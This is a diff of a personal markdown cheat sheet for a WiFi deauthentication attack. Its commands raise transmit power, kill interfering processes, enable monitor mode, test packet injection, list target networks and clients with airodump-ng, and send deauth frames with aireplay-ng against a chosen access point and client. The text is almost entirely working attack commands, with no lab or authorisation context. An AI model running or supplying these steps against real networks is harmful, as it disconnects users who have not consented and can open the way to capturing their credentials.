@@ -1,37 +1,33 @@
 # Deauthentication Attack
-### Set router to max power
-```
-sudo ifconfig wlan1mon down
-```
-```
-sudo iwconfig wlan1mon txpower 30
-```
-```
-sudo ifconfig wlan1mon up
-```
 
 ---
 
-### Check / kill:
-If things are weird
+## Setup
+Set router to max power
 ```
-sudo airmon-ng check kill
+ifconfig wlan1 down
 ```
-
----
-
-### wlan1 Monitor mode:
 ```
-sudo airmon-ng start wlan1
+iwconfig wlan1 txpower 30
 ```
-Interface now is appended `mon` e.g `wlan1mon`
+```
+ifconfig wlan1 up
+```
+Preemptively kill everything that gets in your way:
+```
+airmon-ng check kill
+```
+Start monitor mode:
+```
+airmon-ng start wlan1
+```
 
 ---
 
 ### Test for packet injection
 Once it's in monitor mode, run a test:
 ```
-sudo aireplay-ng --test wlan1mon
+aireplay-ng --test wlan1mon
 ```
 Should see `Injection is working!`
 
@@ -40,7 +36,7 @@ Should see `Injection is working!`
 ### Gather MAC addresses
 Use this command to see live network traffic, enabling you to see all the devices on the network and their MAC addresses. if you run this live you'll inevitably see the clients disconnect and reconnect when you deauth. Remember to add `--band a` for 5GHz: 
 ```
-sudo airodump-ng wlan1mon --band abg -w dump
+airodump-ng wlan1mon --band abg -w dump
 ```
 The top half are going to be the available WIFI networks / Access Points (APs). You have to output to file because the terminal is too small to display all of them. The bottom half are going to be clients/`STATIONS` and the `Probes` should tell you what they're connected to.
 
@@ -49,7 +45,7 @@ The top half are going to be the available WIFI networks / Access Points (APs). 
 ### Monitor traffic
 Once you've found your target, listen to it live with:
 ```
-sudo airodump-ng wlan1mon --bssid XX:XX:XX:XX:XX:XX --band abg
+airodump-ng wlan1mon --bssid XX:XX:XX:XX:XX:XX --band abg
 ```
 OR (try both - router likely broadcasts multiple BSSIDs, once for each GHz or if it multiplate bands(?))
 ```
@@ -66,13 +62,10 @@ sudo aireplay-ng -0 5 -a ACCESSPOINT-BSSID -c CLIENT-BSSID wlan1mon
 
 ---
 
-
----
-
 ## -- NOTES
 You have to be on the same channel as the AP you're deauthing, change it with:
 ```
-sudo iwconfig wlan1mon channel 149
+iwconfig wlan1mon channel 149
 ```
 
 ---
